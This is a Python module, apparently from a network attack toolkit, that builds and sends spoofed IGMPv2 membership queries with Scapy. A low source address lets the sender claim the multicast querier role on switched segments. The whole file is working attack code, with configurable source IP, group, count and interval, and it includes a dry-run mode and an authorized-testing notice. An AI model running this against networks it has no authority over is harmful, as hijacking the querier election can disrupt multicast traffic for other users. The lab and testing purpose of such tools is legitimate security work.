"""IGMP query spoofing: send membership queries from a port that is not the querier.

Hosts answer IGMP membership queries with reports, and snooping switches use the queries and
the reports to learn which ports want which groups. On a segment with several queriers, the one
with the lowest IP address wins the election (RFC 2236, RFC 4541). A device that sends queries
from a low source address can therefore claim the querier role.

This module sends IGMPv2 queries (RFC 2236): general queries to 224.0.0.1, or a group-specific
query for the group the operator gives. The source address and the TTL are the operator's
choice, and the router-alert option is set as RFC 2236 requires.

This module only sends the queries. Whether a switch elects the attacker as querier is what the
lab and the target switch show, not this module.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import IGMP, IP, Ether, sendp
from scapy.layers.inet import IPOption_Router_Alert
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac
from macabre.attacks.igmp_spoofing import group_mac, validate_group

IGMP_QUERY = 0x11
GENERAL_GROUP = "0.0.0.0"
ALL_HOSTS = "224.0.0.1"
MAX_QUERIES = 100
MIN_INTERVAL = 0.5    # seconds
MAX_RESPONSE = 255    # IGMPv2 max response time, in tenths of a second


@dataclass(frozen=True)
class IgmpQuerySpoofingConfig:
    iface: str                          # attacker interface, on the segment with the switch
    source_mac: str                     # the sender's MAC (required)
    source_ip: str = "10.0.0.1"         # the sender's IP; set it lower than the real querier's
    group: str = GENERAL_GROUP          # "0.0.0.0" for a general query, or a multicast group
    max_response: int = 100             # IGMPv2 max response time in tenths of a second
    queries: int = 3                    # queries to send in total
    interval: float = 1.0               # seconds between queries
    dry_run: bool = False               # build queries but do not send them

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.source_mac)
        try:
            address = ipaddress.IPv4Address(self.source_ip)
        except ValueError as exc:
            raise ValueError("Source address must be an IPv4 address.") from exc
        if address.is_multicast or address.is_unspecified:
            raise ValueError("Source address must be a unicast IPv4 address.")
        if self.group != GENERAL_GROUP:
            validate_group(self.group)
        if not 0 <= self.max_response <= MAX_RESPONSE:
            raise ValueError(f"Max response must be between 0 and {MAX_RESPONSE}.")
        if not 1 <= self.queries <= MAX_QUERIES:
            raise ValueError(f"Queries must be between 1 and {MAX_QUERIES}.")
        if self.interval < MIN_INTERVAL:
            raise ValueError(f"Interval must be at least {MIN_INTERVAL} s.")


@dataclass
class IgmpQuerySpoofingStats:
    queries: int = 0
    status: str = ""


def build_query(source_mac: str, source_ip: str, group: str = GENERAL_GROUP, max_response: int = 100) -> Packet:
    """IGMPv2 membership query: general (to 224.0.0.1) or for one group, TTL 1, router-alert option."""
    destination = ALL_HOSTS if group == GENERAL_GROUP else group
    return (
        Ether(src=normalize_unicast_mac(source_mac), dst=group_mac(destination))
        / IP(src=source_ip, dst=destination, ttl=1, proto=2, options=[IPOption_Router_Alert()])
        / IGMP(type=IGMP_QUERY, mrcode=max_response, gaddr=group)
    )


def run_igmp_query_spoofing(
    config: IgmpQuerySpoofingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[IgmpQuerySpoofingStats], None],
    send: Callable[..., Any] | None = None,
) -> IgmpQuerySpoofingStats:
    """Send `queries` IGMP queries, one every `interval` seconds."""
    send = send or sendp
    target = "general query" if config.group == GENERAL_GROUP else f"group query for {config.group}"

    if config.dry_run:
        stats = IgmpQuerySpoofingStats(
            status=(
                f"Dry run: would send {config.queries} IGMP {target} message(s) from {config.source_ip} "
                f"(max response {config.max_response / 10:g} s). Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    frame = build_query(config.source_mac, config.source_ip, config.group, config.max_response)
    stats = IgmpQuerySpoofingStats()
    for _ in range(config.queries):
        if stop_event.is_set():
            break
        send(frame, iface=config.iface, verbose=False)
        stats.queries += 1
        on_progress(replace(stats))
        if stop_event.wait(config.interval):
            break
    return stats
